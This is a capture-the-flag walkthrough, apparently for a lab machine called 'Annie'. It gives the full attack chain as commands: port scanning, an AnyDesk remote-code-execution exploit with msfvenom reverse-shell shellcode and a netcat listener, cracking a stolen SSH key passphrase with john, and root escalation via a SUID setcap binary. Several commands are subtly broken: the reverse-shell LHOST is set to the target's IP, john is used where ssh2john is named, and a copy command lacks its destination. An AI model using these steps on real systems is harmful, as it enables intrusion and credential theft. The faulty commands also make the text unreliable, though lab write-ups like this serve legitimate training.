**Target: 10.10.90.114  Annie**

**Initial Access:**\
nmap -Pn 10.10.90.114 --min-rate=5000 -p- |grep -i open|awk -F '/' '{print $1}'|tr '\n' ',' \
open ports are: 22,7070

Let’s enumerate these ports further:\
nmap -Pn -p 22,7070 --min-rate=5000 -sC -sV -oN nmap.txt   10.10.90.114\
Output shows: port 22 is ssh, port 7070 shows:

![image](https://user-images.githubusercontent.com/93153300/197642654-bf2e7412-d22a-44b1-b855-8a77a5654e86.png)

It seems like a website, but when we navigate to the site it errors out.  However, we can view the certificate of the website.  The certificate name is interesting, AnyDesk Client.  Let’s check to see if AnyDesk has has any exploits, with command: searchsploit anydesk.  

![image](https://user-images.githubusercontent.com/93153300/197642638-4b913ad8-6ea3-49ee-9d21-492f958c74bd.png)

We got back 3 exploits.  Even though we don’t have the version for anydesk, we don’t have much else to enumerate.  One of the exploits is rce, we’ll start with that one.  Download it with searchsploit -m 49613.py.  

Open up the script in a text editor and change the ip address to  the target ip. \
Also, change the shellcode to your generated shellcode.\
Create shellcode with:  \
msfvenom -p linux/x64/shell_reverse_tcp LHOST=10.10.90.114  LPORT=443 -b "\x00\x25\x26" -e x86/shikata_ga_nai -f python -v shellcode\
Delete the current shellcode, and then paste the output shellcode we just generated with msfvenom. 

Open up netcat listener to catch the reverse shell: nc -lvnp 443\
The exploit is written in python2, so change to python 2 enivronment using venv: \
source venv/venv.python2.7/bin/activate\
Finally run the exploit: python 49613.py \
After a few seconds we get a shell on our netcat listener as annie.  \
We can read user.txt: cat /home/annie/user.txt
_________________________________________________
**Persistence:** \
Looking into annie’s home directory with ls -al, we find .ssh directory, cd to .ssh, and we find annie’s private ssh key.  We can use this key to ssh into annie.  \
Download id_rsa file to our pc.\
In order for the key to work we need to change the file permissions.  We will do this with command: chmod 600 id_rsa\
To ssh into the target use command: ssh -i id_rsa annie@10.10.90.114 \
Prompt asks us for a passphrase, so we will try to crack this passphrase with john.  Since we are dealing with ssh here, we will use ssh2john. 

First, convert the id_rsa private key we got from annie into a format that john can use to crack the passphrase.  Use commmand:   \
john id_rsa > john.txt\
Next, we will use john to crack the passphrase:\
john john.txt --wordlist=/usr/share/wordlists/rockyou.txt\
It worked, the passphrase is annie123

Now, we can use the private key id_rsa to ssh into annie.\
ssh -i id_rsa annie@10.10.90.114		→ when prompted, enter the passphrase\
We have shell as annie.
_________________________________________________________________________
**Privilege Escalation:**\
Check for suid with command: find / -perm /4000 2>/dev/null \
There’s an unusual suid found: \
-rwsr-xr-x 1 root root 10K Nov 16  2017 /sbin/setcap (Unknown SUID binary)

This gives us  the ability to set cap_setuid capability on other files.  We will use this to esacalate to root.\
Step 1: Copy python3 to annie’s home directory with command: cp /usr/bin/python3\
Step 2: Give python3 cap_setuid with command: setcap cap_setuid+ep /home/annie/python3\
Step 3: Check that it worked with command: getcap / -r 2>/dev/null\
This getcap command will show us all of our capabilities.  The ouput shows python3 listed with a cap_setuid, so it worked.\
Step 4:Run the command to escalate to root: ./python3 -c 'import os; os.setuid(0); os.system("/bin/bash")'\
We are now root, can go to /root to get the flag.  

![image](https://user-images.githubusercontent.com/93153300/197647483-b5c0b084-6772-42da-b76b-fa4e8234951e.png)
